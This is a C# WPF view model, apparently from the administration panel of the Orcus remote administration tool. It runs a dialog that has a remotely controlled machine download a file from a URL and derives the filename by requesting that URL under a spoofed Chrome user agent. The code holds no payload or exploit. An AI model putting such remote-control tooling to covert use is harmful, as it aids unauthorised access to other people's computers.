using System;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using Orcus.Administration.Core.Utilities;
using Orcus.Administration.ViewModels.ViewInterface;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels.FileExplorer
{
    public class DownloadFileViewModel : PropertyChangedBase
    {
        private readonly string _basePath;
        private RelayCommand _cancelCommand;
        private bool? _dialogResult;
        private RelayCommand _okCommand;
        private string _remotePath;
        private CancellationTokenSource _updatePathCancellationTokenSource;
        private string _url;
        private Task _loadFilnameTask;

        public DownloadFileViewModel(string basePath)
        {
            _basePath = basePath;
            _remotePath = basePath.EndsWith(Path.DirectorySeparatorChar.ToString())
                ? basePath
                : basePath + Path.DirectorySeparatorChar;
        }

        public bool? DialogResult
        {
            get { return _dialogResult; }
            set { SetProperty(value, ref _dialogResult); }
        }

        public string RemotePath
        {
            get { return _remotePath; }
            set { SetProperty(value, ref _remotePath); }
        }

        public string Url
        {
            get { return _url; }
            set
            {
                if (SetProperty(value, ref _url))
                    UpdateRemotePath(value);
            }
        }

        public RelayCommand OkCommand
        {
            get
            {
                return _okCommand ?? (_okCommand = new RelayCommand(async parameter =>
                {
                    if (_basePath == RemotePath)
                    {
                        if (_loadFilnameTask != null)
                            await _loadFilnameTask;
                    }
                    try
                    {
                        new Uri(Url);
                    }
                    catch (Exception e)
                    {
                        WindowServiceInterface.Current.ShowMessageBox(this, e.Message,
                            (string) Application.Current.Resources["Error"], MessageBoxButton.OK, MessageBoxImage.Error);
                    }

                    DialogResult = true;
                }));
            }
        }

        public RelayCommand CancelCommand
        {
            get
            {
                return _cancelCommand ?? (_cancelCommand = new RelayCommand(parameter => { DialogResult = false; }));
            }
        }

        private void UpdateRemotePath(string url)
        {
            Uri uri;

            try
            {
                uri = new Uri(url);
            }
            catch (Exception)
            {
                return;
            }

            _updatePathCancellationTokenSource?.Cancel();
            _updatePathCancellationTokenSource = new CancellationTokenSource();

            _loadFilnameTask = Task.Run(async () =>
            {
                var token = _updatePathCancellationTokenSource.Token;
                var filename = await GetFilenameOfUri(uri, token);
                if (token.IsCancellationRequested || filename == null)
                    return;

                RemotePath = Path.Combine(_basePath, filename);
            });
        }

        private async Task<string> GetFilenameOfUri(Uri uri, CancellationToken cancellationToken)
        {
            var request = (HttpWebRequest) WebRequest.Create(uri);
            request.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
            try
            {
                using (HttpWebResponse res = (HttpWebResponse) await request.GetResponseAsync())
                    //using (var responseStream = res.GetResponseStream())
                {
                    if (cancellationToken.IsCancellationRequested)
                        return null;

                    if (res.Headers["Content-Disposition"] != null)
                        return new ContentDisposition(res.Headers["Content-Disposition"]).FileName;
                    if (res.Headers["Location"] != null)
                        return Path.GetFileName(res.Headers["Location"]);

                    var fixedUrl = (Path.GetFileName(uri.AbsoluteUri).Contains("?") ||
                                    Path.GetFileName(uri.AbsoluteUri).Contains("=")
                        ? res.ResponseUri.ToString()
                        : uri.AbsoluteUri).TrimEnd('/');

                    return fixedUrl.Substring(fixedUrl.LastIndexOf('/') + 1).RemoveSpecialCharacters();
                }
            }
            catch
            {
            }
            return null;
        }
    }
}